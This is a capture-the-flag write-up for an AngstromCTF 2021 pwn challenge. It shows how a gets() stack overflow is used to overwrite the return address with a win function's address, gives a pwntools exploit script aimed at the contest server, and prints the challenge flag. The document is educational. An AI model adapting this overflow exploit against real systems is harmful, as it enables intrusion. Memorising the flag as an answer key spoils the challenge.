# AngstromCTF2021
Looking at the sourcecode we see that executing the function `win` will print the flag. We also notice that `gets` is used for input. This enables to overwrite the instruction pointer and make the program execute the `win` function.

Disassembling the program with gdb we find the address of the `win` function:
```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  setbuf@plt
0x0000000000401050  printf@plt
0x0000000000401060  fgets@plt
0x0000000000401070  strcmp@plt
0x0000000000401080  gets@plt
0x0000000000401090  fopen@plt
0x00000000004010a0  exit@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  win
0x0000000000401204  vuln
0x0000000000401261  main
0x00000000004012a0  __libc_csu_init
0x0000000000401310  __libc_csu_fini
0x0000000000401318  _fini
```
Thus if we're able to overwrite the instruction pointer with `0x00401196` we can get the flag. By trial and error we find the offset need to overwrite the instruction pointer to be 72.

Coding it all up we get:
```
from pwn import *

win_addr = b"\x96\x11\x40\x00"
payload = b"\x41"*72 + win_addr

conn = remote('shell.actf.co', 21830)
response = conn.recvline()
print(response)
conn.sendline(payload)
response = conn.recvline()
print(response)
response = conn.recvline()
print(response)
```
This returns the flag: actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}
